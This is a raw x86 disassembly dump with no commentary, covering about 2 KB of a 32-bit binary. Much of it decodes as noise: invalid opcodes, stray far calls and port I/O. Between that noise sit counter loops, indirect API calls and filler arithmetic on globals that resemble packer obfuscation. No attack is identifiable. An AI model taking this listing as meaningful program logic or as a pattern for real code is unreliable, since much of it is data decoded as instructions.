  418f58:	in     al,dx
  418f59:	hlt    
  418f5a:	mov    ah,0x47
  418f5c:	jns    0x418ef5
  418f5e:	gs lahf 
  418f60:	dec    ebx
  418f61:	cli    
  418f62:	(bad)  [edi]
  418f64:	mov    ebp,0x15cd1c9f
  418f69:	addr16 dec ecx
  418f6b:	xchg   edi,eax
  418f6c:	jg     0x418f46
  418f6e:	mov    BYTE PTR [edx],bl
  418f70:	outs   dx,BYTE PTR ds:[esi]
  418f71:	retf   
  418f72:	sub    ah,BYTE PTR [edx]
  418f74:	mov    bl,ch
  418f76:	push   0xa746375c
  418f7b:	ins    BYTE PTR es:[edi],dx
  418f7c:	push   es
  418f7d:	adc    eax,0x8e4cef6c
  418f82:	jne    0x418f81
  418f84:	jns    0x418f31
  418f86:	mov    bh,0xf5
  418f88:	jp     0x418f0b
  418f8a:	xor    eax,0x320465d
  418f8f:	mov    ah,0xa
  418f91:	mov    edx,0x80a3e66e
  418f96:	inc    edi
  418f97:	out    0x2f,al
  418f99:	jge    0x418f96
  418f9b:	pop    ebp
  418f9c:	jbe    0x418f50
  418f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f9f:	enter  0xea4a,0xe6
  418fa3:	xchg   ebx,eax
  418fa4:	mov    al,ds:0xcc1063dd
  418fa9:	xchg   esp,eax
  418faa:	jo     0x418f45
  418fac:	ror    BYTE PTR [eax+ecx*2-0xb7e52a5],1
  418fb3:	mov    ch,0xf0
  418fb5:	neg    DWORD PTR [edx-0x59ea0ffd]
  418fbb:	cdq    
  418fbc:	xchg   edi,eax
  418fbd:	cwde   
  418fbe:	adc    DWORD PTR [eax],ecx
  418fc0:	scas   al,BYTE PTR es:[edi]
  418fc1:	in     eax,dx
  418fc2:	inc    edi
  418fc3:	push   ecx
  418fc4:	sub    dl,al
  418fc6:	daa    
  418fc7:	add    eax,0x231abc36
  418fcc:	and    dh,BYTE PTR es:[esi]
  418fcf:	xchg   ebp,eax
  418fd0:	in     al,0x37
  418fd2:	sbb    al,0x78
  418fd4:	out    dx,al
  418fd5:	pop    ebp
  418fd6:	pushf  
  418fd7:	dec    edx
  418fd8:	pushf  
  418fd9:	imul   ebx,DWORD PTR [esi+0x4],0x7ef2f4a9
  418fe0:	push   0xffffff85
  418fe2:	fistp  QWORD PTR cs:[ecx-0x5c0cf551]
  418fe9:	jp     0x418fc5
  418feb:	add    cl,dl
  418fed:	jmp    0x418fff
  418fef:	pop    edx
  418ff0:	aam    0xfa
  418ff2:	mov    bl,0x93
  418ff4:	cmp    ebp,DWORD PTR [ebp-0x7]
  418ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ff8:	cwde   
  418ff9:	les    ecx,FWORD PTR [edx+eax*1]
  418ffc:	jl     0x419051
  418ffe:	sbb    ecx,0x5e
  419001:	or     BYTE PTR [ecx-0x71d6e446],0x8c
  419008:	and    esi,esi
  41900a:	xor    DWORD PTR [ecx],esi
  41900c:	inc    ebx
  41900d:	inc    ecx
  41900e:	cmc    
  41900f:	sar    bh,0x9e
  419012:	fs es repnz dec ebx
  419016:	or     ch,bl
  419018:	cmp    esp,DWORD PTR [esi]
  41901a:	adc    BYTE PTR [eax+0xee739f4],ah
  419020:	mov    dh,0xf2
  419022:	test   DWORD PTR [ecx-0x27ace591],ecx
  419028:	call   0xb01f:0x724752ef
  41902f:	xor    al,0x2d
  419031:	pop    ebx
  419032:	sbb    ah,bh
  419034:	std    
  419035:	push   edx
  419036:	in     al,dx
  419037:	cwde   
  419038:	out    dx,al
  419039:	call   0x9019:0x669cbe08
  419040:	popf   
  419041:	test   ebp,0xfdee0541
  419047:	dec    esi
  419048:	sbb    eax,0x780d1dd1
  41904d:	and    eax,0x511b256e
  419052:	leave  
  419053:	mov    edx,0x88751e91
  419058:	or     esi,DWORD PTR [ebx-0x5d]
  41905b:	int    0x7f
  41905d:	mov    al,0x24
  41905f:	or     BYTE PTR [edi],al
  419061:	xchg   edi,eax
  419062:	push   esi
  419063:	je     0x419060
  419065:	dec    edx
  419066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419067:	pop    esp
  419068:	xchg   esp,eax
  419069:	xchg   esi,eax
  41906a:	test   bl,cl
  41906c:	and    eax,0xe4d94c63
  419071:	inc    edi
  419072:	rcr    DWORD PTR ds:0x871b8f37,1
  419078:	aad    0x10
  41907a:	(bad)
  41907d:	mov    al,0xf0
  41907f:	ror    DWORD PTR [edi],cl
  419081:	push   0x29
  419083:	xor    ch,BYTE PTR [edi]
  419085:	std    
  419086:	xchg   DWORD PTR [edx+0x1883d217],ebx
  41908c:	pop    esi
  41908d:	mov    bh,0xcd
  41908f:	dec    esi
  419090:	jecxz  0x419063
  419092:	sti    
  419093:	add    bl,dh
  419095:	xor    eax,0xee1b2a7a
  41909a:	push   cs
  41909b:	leave  
  41909c:	iretw  
  41909e:	xchg   edx,eax
  41909f:	mov    ah,0xa2
  4190a1:	xor    DWORD PTR [esi-0x27],ebx
  4190a4:	add    eax,DWORD PTR [ebp+eiz*2+0x207686]
  4190ab:	push   esi
  4190ac:	mov    ebp,0xb3e63128
  4190b1:	es stos DWORD PTR es:[edi],eax
  4190b3:	(bad)
  4190b6:	mov    ds:0x6856b527,eax
  4190bb:	outs   dx,BYTE PTR ds:[esi]
  4190bc:	xchg   edi,eax
  4190bd:	mov    al,BYTE PTR [edx+esi*1]
  4190c0:	push   edi
  4190c1:	enter  0xb1fd,0xe
  4190c5:	dec    esi
  4190c6:	mov    al,0xa0
  4190c8:	lock and al,0xe4
  4190cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190cc:	jmp    0x630b4847
  4190d1:	mov    edx,0xe744d1ec
  4190d6:	xchg   ebx,eax
  4190d7:	stos   BYTE PTR es:[edi],al
  4190d8:	inc    edx
  4190d9:	dec    eax
  4190da:	xor    ah,BYTE PTR [eax-0x1943e434]
  4190e0:	aaa    
  4190e1:	jecxz  0x419147
  4190e3:	pop    es
  4190e4:	ret    
  4190e5:	jle    0x419116
  4190e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190e8:	inc    ebp
  4190e9:	cdq    
  4190ea:	leave  
  4190eb:	hlt    
  4190ec:	hlt    
  4190ed:	pop    ebx
  4190ee:	push   ss
  4190ef:	xor    al,0xce
  4190f1:	mov    bh,0xc2
  4190f3:	int3   
  4190f4:	inc    esi
  4190f5:	push   ds
  4190f6:	mov    bh,0xf6
  4190f8:	aaa    
  4190f9:	sbb    BYTE PTR [eax-0x1cb72217],0xa
  419100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419101:	ss cmc 
  419103:	xchg   DWORD PTR [edi-0x7f],ecx
  419106:	loope  0x419165
  419108:	ror    BYTE PTR [edx+0x65ec0ad],1
  41910e:	or     eax,eax
  419110:	and    al,0x1d
  419112:	xor    ebx,DWORD PTR [ebp-0x3]
  419115:	shl    ecx,1
  419117:	mov    dh,BYTE PTR [ebp-0x4b]
  41911a:	mov    ecx,DWORD PTR [ebp-0x67]
  41911d:	or     bh,BYTE PTR [ebx]
  41911f:	pop    edi
  419120:	adc    DWORD PTR [eax],esp
  419122:	out    0xf6,al
  419124:	ror    DWORD PTR [eax],0x1f
  419127:	push   edi
  419128:	push   ebx
  419129:	arpl   WORD PTR [eax],si
  41912b:	sub    al,0xc
  41912d:	aam    0xd3
  41912f:	fcomp  st(7)
  419131:	mov    ds:0x72605a5c,eax
  419136:	push   edi
  419137:	je     0x4190e2
  419139:	pop    ss
  41913a:	jmp    0x419136
  41913c:	dec    ax
  41913e:	xchg   DWORD PTR [edi+0x4e],esi
  419141:	push   ds
  419142:	test   BYTE PTR [esi-0x2],0x22
  419146:	sar    BYTE PTR [ebp-0x11],1
  419149:	sub    al,0xc1
  41914b:	mov    dh,0x6
  41914d:	mov    cl,0x96
  41914f:	inc    eax
  419150:	inc    eax
  419151:	in     al,dx
  419152:	mov    WORD PTR [ecx+0x2],gs
  419155:	out    dx,al
  419156:	adc    al,0xa7
  419158:	pushf  
  419159:	shl    DWORD PTR [ecx+0x25],0xbb
  41915d:	inc    ebp
  41915e:	cmp    al,0x2a
  419160:	sub    DWORD PTR [esi-0x6a],edi
  419163:	cmp    cl,BYTE PTR [edx-0x7e873193]
  419169:	xchg   esp,eax
  41916a:	dec    esp
  41916b:	fsubr  QWORD PTR [ebp+0x39373995]
  419171:	dec    DWORD PTR [ecx+0x5a]
  419174:	stos   BYTE PTR es:[edi],al
  419175:	push   edx
  419176:	rcr    BYTE PTR es:[edi-0x31460500],1
  41917d:	repnz mov BYTE PTR [esi],cl
  419180:	add    al,0x54
  419182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419183:	into   
  419184:	out    dx,eax
  419185:	lahf   
  419186:	jnp    0x4191ac
  419188:	outs   dx,BYTE PTR ds:[esi]
  419189:	cli    
  41918a:	call   eax
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    cs,WORD PTR [edi+0x8eec926]
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x4191fc
  4191bc:	shr    BYTE PTR [ebx+0x72],cl
  4191bf:	push   esi
  4191c0:	in     eax,0xad
  4191c2:	jg     0x41921a
  4191c4:	inc    esp
  4191c5:	push   0xcc1b7bac
  4191ca:	pop    esi
  4191cb:	cmc    
  4191cc:	clc    
  4191cd:	fxam   
  4191cf:	aaa    
  4191d0:	jge    0x419210
  4191d2:	repz imul esp,DWORD PTR [ebp-0x35],0xffffffe8
  4191d7:	rcl    BYTE PTR [edx-0x3a138a46],cl
  4191dd:	repnz add dl,BYTE PTR [esi]
  4191e0:	imul   ecx,DWORD PTR [edx-0x74bf71e0],0xfffffff3
  4191e7:	cdq    
  4191e8:	ret    
  4191e9:	mov    esi,0x4c3d1a76
  4191ee:	call   0xa0d7:0xf26a04c6
  4191f5:	movlps xmm6,QWORD PTR ds:0x8671e593
  4191fc:	adc    DWORD PTR [edx-0x7614aa47],eax
  419202:	fnstcw WORD PTR [ecx+0x4ee4ad20]
  419208:	fcmovnu st,st(2)
  41920a:	xor    ch,ah
  41920c:	paddd  mm4,QWORD PTR [edx-0x8]
  419210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419211:	ss dec ebx
  419213:	call   0x8211e031
  419218:	inc    edx
  419219:	js     0x41925f
  41921b:	add    ebx,DWORD PTR [ebx-0x3aaf7e1a]
  419221:	and    DWORD PTR [edx-0x6],edi
  419224:	mov    edi,0x3c0defcb
  419229:	enter  0x6a48,0xfd
  41922d:	inc    edi
  41922e:	and    eax,DWORD PTR [edx+0x32]
  419231:	inc    ecx
  419232:	mov    ch,0x8b
  419234:	dec    edi
  419235:	mov    ds:0x49561f3d,al
  41923a:	pop    ebx
  41923b:	das    
  41923c:	fcomp  QWORD PTR [edi-0x2b]
  41923f:	mov    ds:0xa922285,al
  419244:	mov    ?,WORD PTR [eax+0x6cf9c566]
  41924a:	pop    es
  41924b:	into   
  41924c:	and    eax,0x760fbf38
  419251:	cmc    
  419252:	inc    eax
  419253:	jle    0x419224
  419255:	xchg   edx,eax
  419256:	cmp    BYTE PTR [ecx+esi*4+0x19],ch
  41925a:	(bad)  
  41925b:	pop    ebx
  41925c:	stc    
  41925d:	pop    edi
  41925e:	aad    0xf6
  419260:	and    BYTE PTR [eax+0x4579ac23],ch
  419266:	test   eax,0x312f166
  41926b:	dec    esi
  41926c:	fs pop ebx
  41926e:	ficomp WORD PTR [ecx-0x67d92fdd]
  419274:	or     dh,BYTE PTR [edi-0xd]
  419277:	data16 jge 0x41928a
  41927a:	pusha  
  41927b:	out    dx,al
  41927c:	in     al,dx
  41927d:	rcl    BYTE PTR [ebx],1
  41927f:	sub    BYTE PTR [esi+0x44],dh
  419282:	sbb    eax,0x9532b439
  419287:	and    DWORD PTR [eax+ebx*8],edx
  41928a:	mov    DWORD PTR [edi+0x682381cc],edx
  419290:	sub    BYTE PTR [edi+0x11],bl
  419293:	(bad)  
  419294:	mov    ah,0x2e
  419296:	in     al,dx
  419297:	pop    esi
  419298:	jne    0x419245
  41929a:	pop    eax
  41929b:	test   BYTE PTR [edi+0x24aed368],cl
  4192a1:	mov    al,BYTE PTR [ebx+0x33c8e5eb]
  4192a7:	cmp    eax,0xcfe9e8ef
  4192ac:	clc    
  4192ad:	nop
  4192ae:	pop    ecx
  4192af:	xchg   ebx,eax
  4192b0:	xor    bx,si
  4192b3:	mov    al,ds:0x9cc29b9a
  4192b8:	dec    esi
  4192b9:	cmp    BYTE PTR [edx+esi*4-0x31756e95],0x0
  4192c1:	push   0x5f
  4192c3:	sub    esp,edx
  4192c5:	iret   
  4192c6:	test   ebx,edx
  4192c8:	pop    ds
  4192c9:	iret   
  4192ca:	and    al,0xf
  4192cc:	dec    ebp
  4192cd:	jno    0x4192ed
  4192cf:	shl    DWORD PTR [ecx],0xd5
  4192d2:	imul   edx,DWORD PTR [eax-0x5ea6e67b],0xffffffb5
  4192d9:	bound  esi,QWORD PTR [esi+0x45]
  4192dc:	repnz mov al,0xab
  4192df:	lahf   
  4192e0:	cmp    eax,0xc50417b1
  4192e5:	int3   
  4192e6:	ins    BYTE PTR es:[edi],dx
  4192e7:	jecxz  0x419367
  4192e9:	pusha  
  4192ea:	(bad)  
  4192eb:	and    DWORD PTR [eax-0x79],esi
  4192ee:	mov    bl,0x12
  4192f0:	loop   0x4192cf
  4192f2:	neg    DWORD PTR [ebp+0x271f55a8]
  4192f8:	inc    eax
  4192f9:	xchg   esi,eax
  4192fa:	rcr    DWORD PTR [ebx+0x25],1
  4192fd:	inc    edx
  4192fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ff:	cmp    al,0xaf
  419302:	and    dl,BYTE PTR [ecx+ebx*1+0x43]
  419306:	ins    DWORD PTR es:[edi],dx
  419307:	push   ebx
  419308:	mov    edi,0xf1c55467
  41930d:	sbb    eax,0x922534a9
  419312:	mov    al,BYTE PTR [eax]
  419314:	dec    edx
  419315:	adc    al,0x94
  419317:	cwde   
  419318:	call   0x7558:0xd72d7bb
  41931f:	stc    
  419320:	daa    
  419321:	sbb    eax,0x87d6d789
  419326:	mov    DWORD PTR [eax-0x48],edx
  419329:	fxch   st(2)
  41932b:	fnstcw WORD PTR [edx-0x49]
  41932e:	daa    
  41932f:	mov    al,0xbf
  419331:	push   esp
  419332:	mov    DWORD PTR [ecx+0x7f232636],eax
  419338:	pop    eax
  419339:	std    
  41933a:	(bad)  
  41933b:	cmp    al,ch
  41933d:	cmp    eax,0xc4614766
  419342:	cmpxchg DWORD PTR [ebx+0x34],edx
  419346:	sahf   
  419347:	and    bl,BYTE PTR ss:[esi]
  41934a:	jle    0x4192d4
  41934c:	loopne 0x41938f
  41934e:	dec    ecx
  41934f:	adc    eax,0xb39ecd0b
  419354:	and    dl,BYTE PTR [ebx]
  419356:	(bad)  
  419357:	mov    ecx,0x7084393d
  41935c:	mov    bh,0x5b
  41935e:	mov    al,BYTE PTR [eax+0x6d9ef652]
  419364:	cmp    eax,0x22932d07
  419369:	push   edx
  41936a:	add    BYTE PTR [ebx-0x5],bl
  41936d:	gs or  al,0x8a
  419370:	pop    esi
  419371:	mov    dl,0xe7
  419373:	inc    esp
  419375:	pusha  
  419376:	sahf   
  419377:	(bad)  
  419379:	rcr    esp,1
  41937b:	sub    esp,DWORD PTR [edi+eax*4-0x46]
  41937f:	pop    es
  419380:	sbb    cl,BYTE PTR ds:0x480bf04c
  419386:	inc    esp
  419387:	xchg   ebp,eax
  419388:	fmul   st(4),st
  41938a:	data16 mov ?,WORD PTR [esi-0x72]
  41938e:	les    ebx,FWORD PTR [ecx+edi*8+0x69]
  419392:	xchg   ecx,eax
  419393:	cwde   
  419394:	sbb    eax,0x65fb0f47
  419399:	clc    
  41939a:	shr    BYTE PTR ds:0x38e224d9,cl
  4193a0:	in     eax,dx
  4193a1:	data16 cmp al,0x50
  4193a4:	leave  
  4193a5:	and    BYTE PTR [ecx],bl
  4193a7:	pcmpeqb mm2,QWORD PTR [esi]
  4193aa:	fist   WORD PTR [esi+0x35e973b0]
  4193b0:	arpl   WORD PTR [ebp+0x2555a138],cx
  4193b6:	pop    esp
  4193b7:	jns    0x4193ae
  4193b9:	out    0xd2,eax
  4193bb:	repnz sub dh,ch
  4193be:	cdq    
  4193bf:	and    al,0xf3
  4193c1:	sbb    eax,eax
  4193c3:	sub    BYTE PTR [esi],dl
  4193c5:	cmp    cl,BYTE PTR [edi-0x6bcdc098]
  4193cb:	fcomp  DWORD PTR [ebx]
  4193cd:	arpl   WORD PTR [ebx+ebx*1-0x61],dx
  4193d1:	sar    ebp,0xc7
  4193d4:	inc    ebp
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	(bad)  [edx+0x42]
  4193e2:	add    BYTE PTR [eax],al
  4193e4:	xor    ecx,ecx
  4193e6:	add    ecx,DWORD PTR ds:0x42aadd
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42aadd,ecx
  4193f3:	cmp    DWORD PTR ds:0x42aadd,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42aadd,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42aa61,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42aa61
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42aa61,ecx
  419434:	cmp    DWORD PTR ds:0x42aa61,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42aa61,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42abef
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42aa11,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42aa6d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42aa6d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42aa6d,ecx
  41948e:	cmp    DWORD PTR ds:0x42aa6d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aca8
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42aa6d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42aa65
  4194bb:	and    DWORD PTR ds:0x42a9d5,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a9cd,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a9d9
  4194d8:	adc    DWORD PTR ds:0x42aad1,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a9c1,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42aadd
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42aa55,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42aa99,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x79],eax
  41952b:	fimul  WORD PTR [eax+0x7fcb20c2]
  419531:	js     0x419543
  419533:	jle    0x4195ad
  419535:	js     0x419551
  419537:	adc    esi,edi
  419539:	sbb    dl,BYTE PTR [ecx+0x2c8598da]
  41953f:	lods   eax,DWORD PTR ds:[esi]
  419540:	outs   dx,DWORD PTR ds:[esi]
  419541:	dec    ebx
  419542:	imul   esi,DWORD PTR [esi-0x6e],0x6c
  419546:	mov    eax,ds:0x2a34370
  41954b:	jmp    0xd399:0x7a5daaa5
  419552:	retf   0xb5c8
  419555:	push   cs
  419556:	adc    bh,bh
  419558:	jle    0x41958a
  41955a:	jge    0x4195a4
  41955c:	sub    eax,0xa2bf0cbe
  419561:	and    ebp,esp
  419563:	test   eax,0x268728b9
  419568:	inc    eax
  419569:	popf   
  41956a:	xchg   ebp,eax
  41956b:	xor    edi,DWORD PTR [ebx+0x55]
  41956e:	add    BYTE PTR ds:0xf5f48166,dl
  419574:	scas   al,BYTE PTR es:[edi]
  419575:	gs or  ebx,esi
  419578:	add    DWORD PTR [eax-0x3b5830d],esi
  41957e:	sub    DWORD PTR [edx],ecx
  419580:	inc    esi
  419581:	daa    
  419582:	pop    ecx
  419583:	adc    eax,0x581aeb4f
  419588:	lods   al,BYTE PTR ds:[esi]
  419589:	vpcomb xmm0,xmm2,XMMWORD PTR [esi+r8d*1+0x4d75d3b0],0xdd
  419594:	das    
  419595:	call   0xfde123f4
  41959a:	mov    al,0x83
  41959c:	enter  0x1da2,0x24
  4195a0:	pop    edx
  4195a1:	push   ebp
  4195a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195a3:	xlat   BYTE PTR ds:[ebx]
  4195a4:	rol    esp,1
  4195a6:	shr    DWORD PTR [edx],cl
  4195a8:	pop    esp
  4195a9:	lods   al,BYTE PTR ds:[esi]
  4195aa:	in     al,0xac
  4195ac:	jle    0x4195a9
  4195ae:	inc    eax
  4195af:	(bad)  [edi]
  4195b1:	call   0xeed6:0x235df208
  4195b8:	xchg   edx,eax
  4195b9:	dec    ebx
  4195ba:	shl    DWORD PTR [edi],cl
  4195bc:	mov    edx,0x91358f75
  4195c1:	dec    ebp
  4195c2:	aaa    
  4195c3:	aas    
  4195c4:	imul   esi,DWORD PTR [ebx-0x5e],0xffffffd9
  4195c8:	inc    esp
  4195c9:	pop    esp
  4195ca:	in     al,dx
  4195cb:	jnp    0x4195e6
  4195cd:	lds    ebx,FWORD PTR [ebx-0x6719194f]
  4195d3:	sbb    ebx,ebx
  4195d5:	dec    ebx
  4195d6:	cmp    DWORD PTR [edi-0x28075f48],esi
  4195dc:	pop    edi
  4195dd:	addr16 fistp QWORD PTR [bp+si+0x64f]
  4195e3:	pop    edx
  4195e4:	push   ss
  4195e5:	ret    0xcf7a
  4195e8:	adc    DWORD PTR [edx-0x439917ac],ebp
  4195ee:	ins    BYTE PTR es:[edi],dx
  4195ef:	mov    esi,eax
  4195f1:	push   0x52
  4195f3:	mov    BYTE PTR [esp+ebp*1+0x4b638761],bl
  4195fa:	push   esp
  4195fb:	mov    al,ds:0x9cc5d221
  419600:	jmp    0xa9d4a4a4
  419605:	xlat   BYTE PTR ds:[ebx]
  419606:	push   edi
  419607:	popa   
  419608:	sar    DWORD PTR [eax],cl
  41960a:	sbb    eax,0x272ea6ff
  41960f:	mov    edi,0x1c9ad03e
  419614:	mov    edx,esi
  419616:	mov    edi,0xff73d3c8
  41961b:	in     eax,0x60
  41961d:	mov    cl,0x19
  41961f:	mov    bl,0xfb
  419621:	std    
  419622:	sti    
  419623:	adc    al,0x63
  419625:	push   ds
  419626:	out    0x87,eax
  419628:	(bad)  [eax-0x3e]
  41962b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41962c:	push   es
  41962d:	mov    ch,0x5d
  41962f:	and    eax,0xad269f90
  419634:	pop    edx
  419635:	int3   
  419636:	gs pop edx
  419638:	sub    ah,al
  41963a:	pop    edi
  41963b:	imul   edi,eax,0x52
  41963e:	mov    WORD PTR es:[edi-0x3844a2a9],ds
  419645:	sbb    dh,ch
  419647:	or     BYTE PTR [edi+0x2fba03bf],ah
  41964d:	scas   eax,DWORD PTR es:[edi]
  41964e:	pop    ecx
  41964f:	in     eax,dx
  419650:	mov    esp,0xc78814a7
  419655:	in     eax,dx
  419656:	pop    edi
  419657:	daa    
  419658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419659:	mov    ah,0x21
  41965b:	jmp    0x1364:0x6812dbc3
  419662:	pop    esi
  419663:	inc    esi
  419664:	and    ebx,DWORD PTR [ecx+0x2e]
  419667:	push   ss
  419668:	or     al,0xe8
  41966a:	mov    ds:0xb6f3671c,al
  41966f:	clc    
  419670:	cmp    edx,DWORD PTR [ebp-0x6c]
  419673:	or     eax,ebp
  419675:	xchg   edx,eax
  419676:	or     al,0xf1
  419678:	scas   eax,DWORD PTR es:[edi]
  419679:	xor    al,0x2a
  41967b:	out    0x27,eax
  41967d:	lods   al,BYTE PTR ds:[esi]
  41967e:	aad    0xc8
  419680:	cmp    ch,dl
  419682:	pop    ss
  419683:	push   eax
  419684:	stos   DWORD PTR es:[edi],eax
  419685:	dec    esp
  419686:	xor    DWORD PTR [edi+0x4],ebx
  419689:	push   cs
  41968a:	xor    esi,eax
  41968c:	xor    DWORD PTR [ebx],eax
  41968e:	cs ja  0x419669
  419691:	iret   
  419692:	cmp    WORD PTR [ebp-0x3d95c2c],0x4b4e
  41969b:	(bad)  
  41969c:	ins    BYTE PTR es:[edi],dx
  41969d:	ss add ebx,edi
  4196a0:	jo     0x419699
  4196a2:	adc    al,0xb3
  4196a4:	je     0x41970e
  4196a6:	jns    0x4196c1
  4196a8:	rol    ah,0x92
  4196ab:	ret    
  4196ac:	pop    ss
  4196ad:	je     0x4196f7
  4196af:	inc    DWORD PTR [ebx-0x38]
  4196b2:	daa    
  4196b3:	lods   al,BYTE PTR ds:[esi]
  4196b4:	aam    0xb6
  4196b6:	dec    ecx
  4196b7:	or     DWORD PTR [ecx+edi*8-0xd],ebp
  4196bb:	and    DWORD PTR [edx+esi*8+0x225680c7],ecx
  4196c2:	jae    0x419700
  4196c4:	inc    ebx
  4196c5:	clc    
  4196c6:	mov    dl,0x16
  4196c8:	dec    ebp
  4196c9:	(bad)  
  4196ca:	fldenv [ebx+0x31]
  4196cd:	xor    DWORD PTR [eax-0x7f],esp
  4196d0:	in     eax,0x87
  4196d2:	dec    esp
  4196d3:	push   ebx
  4196d4:	imul   edi,esp,0x1e
  4196d7:	pop    edx
  4196d8:	aad    0xc8
  4196da:	inc    edi
  4196db:	adc    al,0xe5
  4196dd:	sub    cl,bl
  4196df:	(bad)  
  4196e0:	mov    eax,ds:0xed3fa706
  4196e5:	inc    edx
  4196e6:	xchg   ebx,eax
  4196e7:	cmp    BYTE PTR [edx+0x1634fd6b],cl
  4196ed:	dec    ebx
  4196ee:	call   0x125cc4d3
  4196f3:	std    
  4196f4:	push   ecx
  4196f5:	xor    DWORD PTR [ecx+eax*1-0x42],0x3
  4196fa:	xchg   esi,eax
  4196fb:	or     BYTE PTR [eax-0x62bdebdf],bl
  419701:	test   BYTE PTR [ecx+0x4e00aaf4],al
  419707:	js     0x4196b3
  419709:	daa    
  41970a:	enter  0x38cc,0x1d
  41970e:	cmp    eax,0x6ae40508
  419713:	fisttp DWORD PTR [ebp+0x2759e123]
  419719:	inc    eax
  41971a:	loopne 0x41975a
  41971c:	int3   
  41971d:	jge    0x419726
  41971f:	push   ds
  419720:	push   0xffffffb0
  419722:	pop    eax
  419723:	(bad)  
  419724:	xchg   ebx,eax
  419725:	enter  0x5336,0x4a
  419729:	scas   al,BYTE PTR es:[edi]
  41972a:	sub    BYTE PTR [ecx+0x2fffbfe],0x13
  419731:	mov    ds:0x2ea40695,eax
  419736:	or     edi,edi
  419738:	or     DWORD PTR [eax-0xb],eax
  41973b:	test   al,0x26
  41973d:	loop   0x4196ef
  41973f:	pushf  
  419740:	ins    BYTE PTR es:[edi],dx
  419741:	frstor [ebp+0x2fd8e00b]
  419747:	stos   BYTE PTR es:[edi],al
  419748:	imul   edi,DWORD PTR [eax-0x4b],0x8b55c064
  41974f:	dec    ebp
  419750:	adc    al,0x3
  419752:	test   BYTE PTR [ebx-0x1bb276f7],0xf
  419759:	scas   eax,DWORD PTR es:[edi]
  41975a:	shl    BYTE PTR [ebx],1
  41975c:	cmp    eax,0x42aa61
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42aadd,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42aaa5
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42aa15,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x1f5bddeb
  41979d:	mov    WORD PTR [ebp+0x787fc938],?
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x419810
  4197a8:	pop    ebp
  4197a9:	adc    ch,BYTE PTR [ebp-0x4bbb7449]
  4197af:	and    ch,BYTE PTR [edi-0x51ba5c1e]
  4197b5:	mov    ah,0x5c
  4197b7:	pop    edi
